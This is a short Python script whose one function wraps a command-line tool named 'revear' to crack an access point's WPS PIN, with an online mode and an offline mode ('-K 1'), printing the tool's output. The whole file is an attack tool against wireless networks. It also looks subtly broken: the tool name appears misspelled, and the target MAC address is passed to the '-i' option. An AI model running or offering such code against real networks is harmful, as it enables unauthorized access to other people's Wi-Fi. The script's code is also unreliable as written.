import subprocess

def wps_crack(wps_offline, ap_mac_address, channel, ssid):

    if wps_offline == False:

        first_command_wps = subprocess.run(['revear', '-i', ap_mac_address,
                                   '-c', channel, '-e', ssid], capture_output=True, text=True)
        print(first_command_wps.stdout)

    else:
        second_command_wps = subprocess.run(
            ['revear', '-i', ap_mac_address, '-vvv', '-K', '1'], capture_output=True, text=True)
        print(second_command_wps.stdout)
